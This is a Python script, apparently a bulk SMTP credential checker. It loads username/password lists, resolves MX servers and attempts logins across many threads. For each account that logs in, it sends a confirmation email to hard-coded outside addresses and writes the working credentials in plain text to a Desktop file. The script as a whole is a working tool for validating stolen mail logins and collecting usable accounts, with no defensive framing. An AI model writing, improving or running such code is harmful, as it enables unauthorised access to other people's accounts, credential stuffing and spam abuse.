import os
import re
import smtplib
import socket
import threading
import queue
import time
from collections import defaultdict
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from EEPro import Engine
from servers import Credentials

result_queue = queue.Queue()
threads = []  # Track active threads
successful_credentials = set()  # Track successfully authenticated credentials
lock = threading.Lock()  # Lock for thread-safe updates

engine = Engine()

def load_credentials(file_path):
    smtps = engine.read_file(file_path)
    if smtps is None:
        engine.logger.error("No valid SMTP credentials loaded from file: %s", file_path)
        return []
    engine.logger.info("Loading SMTP credentials from file: %s", file_path)
    credentials = []
    for line in smtps:
        parts = line.strip().split('|')
        if len(parts) == 4:
            username = parts[2].strip()
            if '@' not in username:
                engine.logger.warning("Invalid username format: %s", username)
                continue
            try:
                port = int(parts[1].strip())  # Parse port from parts[1]
            except ValueError:
                engine.logger.warning("Invalid port format: %s, skipping %s", parts[1], username)
                continue
            password = parts[3]
            domain = username.split('@')[1].strip().lower()
            details = Credentials(None, port, username, password, domain)
            credentials.append(details)
            engine.logger.debug("Loaded credential: %s for domain %s, port %d", username, domain, port)
        else:
            engine.logger.warning("Invalid credential format: %s", line.strip())
    engine.logger.info("Loaded %d SMTP credentials.", len(credentials))
    return credentials

def group_by_host(credentials):
    grouped = defaultdict(list)
    domain_cache = {}
    for credential in credentials:
        if re.match(r"[^@]+@[^@]+\.[^@]+", credential.username) and engine.filter_spam(credential.username.split('@')[0].strip()):
            domain = credential.username.split('@')[1].strip().lower()
            if not engine.is_banned_tld(domain):
                if domain in domain_cache:
                    mx_servers = domain_cache[domain]
                else:
                    mx_servers = engine.get_mx_servers(domain)
                    domain_cache[domain] = mx_servers
                    engine.logger.debug("MX lookup for %s: %s", domain, mx_servers if mx_servers else "None")
                
                # Handle case where mx_servers is a list
                if isinstance(mx_servers, list) and mx_servers:
                    # Use the first MX server (or implement logic to select the best one)
                    mx_server = mx_servers[0]  # Select the first MX server
                    credential.host = mx_server
                    key = (mx_server, credential.port)
                    grouped[key].append(credential)
                    engine.logger.debug("Grouped credential %s under %s:%d", credential.username, mx_server, credential.port)
                elif isinstance(mx_servers, str) and mx_servers:
                    # If mx_servers is a single string
                    credential.host = mx_servers
                    key = (mx_servers, credential.port)
                    grouped[key].append(credential)
                    engine.logger.debug("Grouped credential %s under %s:%d", credential.username, mx_servers, credential.port)
                else:
                    engine.logger.warning("No valid MX server found for domain: %s, skipping %s", domain, credential.username)
            else:
                engine.logger.warning("Skipping credential %s due to banned TLD: %s", credential.username, domain)
        else:
            engine.logger.warning("Skipping invalid or spam credential: %s", credential.username)
    engine.logger.info("%d servers found for processing.", len(grouped))
    return grouped

def test_smtp_credential(host, port, credential):
    credential_key = f"{credential.username}"
    with lock:  # Thread-safe check
        if credential_key in successful_credentials:
            engine.logger.info("Skipping already authenticated credential: %s", credential_key)
            return

    engine.logger.info("Testing SMTP credential for %s on %s:%d", credential.username, host, port)
    try:
        # Initialize SMTP connection
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=10)
            engine.logger.debug("Connected to SMTP server %s:%d for %s using SSL", host, port, credential.username)
            server.ehlo(f"{credential.domain}")
            engine.logger.debug("EHLO sent for %s", credential.domain)
        else:
            server = smtplib.SMTP(host, port, timeout=10)
            engine.logger.debug("Connected to SMTP server %s:%d for %s", host, port, credential.username)
            server.ehlo(f"{credential.domain}")
            engine.logger.debug("EHLO sent for %s", credential.domain)
            server.starttls()
            engine.logger.debug("STARTTLS initiated for %s", credential.username)
            server.ehlo(f"{credential.domain}")
            engine.logger.debug("Second EHLO sent for %s", credential.domain)
        
        # Login
        server.login(credential.username, credential.password)
        engine.logger.info("Successfully logged in for %s", credential.username)
        
        # Send test email
        msg = MIMEMultipart()
        msg['From'] = credential.username
        msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com, quacklabsystems@yahoo.com'
        msg['Subject'] = 'Validation completed'
        body = f"This is a test email to validate the connection for {credential.username}."
        msg.attach(MIMEText(body, 'plain'))
        server.sendmail(credential.username, ['mark.boleigha@outlook.com', 'donhoenix@gmail.com'], msg.as_string())
        engine.logger.info("Test email sent successfully for %s to recipients", credential.username)
        
        # Save valid credential
        with lock:  # Thread-safe update
            save_valid_smtp(host, credential)
            successful_credentials.add(credential_key)
            result_queue.put(f"Success: {credential.username}")
        
        server.noop()
        engine.logger.debug("NOOP sent to keep connection alive for %s", credential.username)
        server.quit()
    except smtplib.SMTPAuthenticationError as e:
        engine.logger.error("Authentication failed for %s: %s", credential.username, str(e))
        with lock:
            result_queue.put(f"Failure: {credential.username} - Authentication failed: {str(e)}")
    except smtplib.SMTPConnectError as e:
        engine.logger.error("Connection failed for %s: %s", credential.username, str(e))
        with lock:
            result_queue.put(f"Failure: {credential.username} - Connection failed: {str(e)}")
    except (smtplib.SMTPException, socket.error) as e:
        engine.logger.error("SMTP test failed for %s: %s", credential.username, str(e))
        with lock:
            result_queue.put(f"Failure: {credential.username} - SMTP error: {str(e)}")
    except Exception as e:
        engine.logger.error("Unexpected error for %s: %s", credential.username, str(e))
        with lock:
            result_queue.put(f"Failure: {credential.username} - Unexpected error: {str(e)}")

def save_valid_smtp(host, credential, save_dir=None):
    if save_dir is None:
        save_dir = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.join(save_dir, "valid_smtp.txt")
    try:
        # Ensure the directory exists
        os.makedirs(save_dir, exist_ok=True)
        # Test file write permissions
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"{host}|{credential.port}|{credential.username}|{credential.password}\n")
        engine.logger.info("Successfully saved valid SMTP: %s for %s:%d to %s", credential.username, host, credential.port, file_path)
    except PermissionError as e:
        engine.logger.error("Permission denied when saving to %s: %s", file_path, str(e))
    except OSError as e:
        engine.logger.error("OS error when saving to %s: %s", file_path, str(e))
    except Exception as e:
        engine.logger.error("Failed to save valid SMTP for %s to %s: %s", credential.username, file_path, str(e))

def process_credentials(grouped_credentials):
    engine.logger.info("Starting credential processing for %d server groups.", len(grouped_credentials))
    for (host, port), credentials in grouped_credentials.items():
        engine.logger.debug("Processing %d credentials for %s:%d", len(credentials), host, port)
        for credential in credentials:
            thread = threading.Thread(
                target=test_smtp_credential,
                args=(host, port, credential),
                name=f"SMTPChecker-{credential.username}"
            )
            thread.start()
            threads.append(thread)
            engine.logger.debug("Started thread for credential %s on %s:%d", credential.username, host, port)

def start_checker(file_path):
    engine.logger.info("Starting SMTP checker with file: %s", file_path)
    smtp_credentials = load_credentials(file_path)
    if not smtp_credentials:
        engine.logger.error("No valid SMTP credentials loaded. Exiting.")
        return []

    # Test file write permissions before processing
    save_dir = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.join(save_dir, "valid_smtp.txt")
    try:
        os.makedirs(save_dir, exist_ok=True)
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("")  # Test write
        engine.logger.debug("Confirmed write access to %s", file_path)
    except Exception as e:
        engine.logger.error("Cannot write to %s: %s. Check permissions or disk space.", file_path, str(e))
        return []

    grouped_credentials = group_by_host(smtp_credentials)
    process_credentials(grouped_credentials)

    for thread in threads:
        thread.join()
        engine.logger.debug("Thread joined: %s", thread.name)

    results = []
    while not result_queue.empty():
        result = result_queue.get()
        results.append(result)
        engine.logger.debug("Collected result: %s", result)
    engine.logger.info("Completed SMTP checker with %d results.", len(results))
    return results